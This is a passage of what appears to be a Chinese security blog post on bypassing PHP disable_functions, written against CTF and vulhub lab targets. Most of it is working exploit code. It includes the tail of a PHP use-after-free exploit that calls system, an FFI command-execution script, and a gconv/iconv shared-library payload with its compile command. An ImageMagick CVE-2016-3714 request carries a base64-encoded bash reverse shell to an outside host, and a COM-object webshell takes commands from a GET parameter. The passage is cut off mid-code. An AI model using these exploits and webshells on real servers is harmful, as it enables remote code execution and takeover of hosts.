punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'constant' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment"># 'bin2hex' constant check</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># ELF header</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token shell-comment comment"># system</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token shell-comment comment"># str_shuffle prevents opcache string interning</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># increase this value if UAF fails</span>    <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'A'</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># leaks</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake value</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># fake reference</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token shell-comment comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func type</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150029505.png"></p><h2 id="FFI-扩展"><a href="#FFI-扩展" class="headerlink" title="FFI 扩展"></a>FFI 扩展</h2><blockquote><p>For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.</p></blockquote><p>通过FFI来调用C中的system进而达到执行命令的目的</p><p><a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式</a></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150028144.png"></p><p><code>exp.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"tac /flag >/tmp/1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/tmp/1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/tmp/1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150028703.png"></p><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h2><p><code>/tmp</code>下上传<code>gconv-modules</code></p><blockquote><p>module  PAYLOAD//    INTERNAL    ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/.38277ant_x64    2<br>module  INTERNAL    PAYLOAD//    ../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/.38277ant_x64    2</p></blockquote><p><code>payload.c</code></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>编译</p><p><code>gcc payload.c -o .38277ant_x64.so -shared -fPIC</code></p><p>上传so文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".38277ant_x64"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>或者插件一把梭</p><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p><a href="https://www.anquanke.com/post/id/208451#h2-8">https://www.anquanke.com/post/id/208451#h2-8</a></p><p><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><blockquote><p>ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等</p><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick 6.9.3-9</p></blockquote><p>这里用vulhub的靶场</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142105344.png"></p><p><code>http://ip:8080</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204150027187.png"></p><p><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file_upload'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'jpeg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unsupported filetype uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"identify -format '%w x %h' <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file_upload'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Image size is: <span class="token interpolation"><span class="token variable">$size</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    File: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file_upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">endif</span><span class="token punctuation">;</span></span></code></pre><p>poc</p><pre class="language-txt" data-language="txt"><code class="language-txt">POST &#x2F; HTTP&#x2F;1.1Host: 192.168.17.131:8080User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------51311702611553780672132934630Content-Length: 441Origin: http:&#x2F;&#x2F;192.168.17.131:8080Connection: closeReferer: http:&#x2F;&#x2F;192.168.17.131:8080&#x2F;Upgrade-Insecure-Requests: 1-----------------------------51311702611553780672132934630Content-Disposition: form-data; name&#x3D;&quot;file_upload&quot;; filename&#x3D;&quot;1.gif&quot;Content-Type: application&#x2F;octet-streampush graphic-contextviewbox 0 0 640 480fill &#39;url(https:&#x2F;&#x2F;127.0.0.0&#x2F;oops.jpg?&#96;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTcuMTI4Lzk5OTkgMD4mMQ&#x3D;&#x3D; | base64 -d | bash&#96;&quot;||id &quot; )&#39;pop graphic-context-----------------------------51311702611553780672132934630--</code></pre><p><code>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTcuMTI4Lzk5OTkgMD4mMQ==</code>—-&gt;</p><p><code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.17.128/9999 0&gt;&amp;1</code></p><p>监听端口反弹到shell</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142109006.png"></p><h2 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件</h2><blockquote><p>window下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152201775.png"></p><pre class="language-php" data-language="php"><code class="language-php">//exp.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$wsh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 生成一个COM对象　Shell.Application也能</span><span class="token variable">$exec</span> <span class="token operator">=</span> <span class="token variable">$wsh</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cmd /c"</span><span class="token punctuation">.</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用对象方法来执行命令</span><span class="token variable">$stdout</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stroutput</span> <span class="token operator">=</span> <span class="token variable">$stdout</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 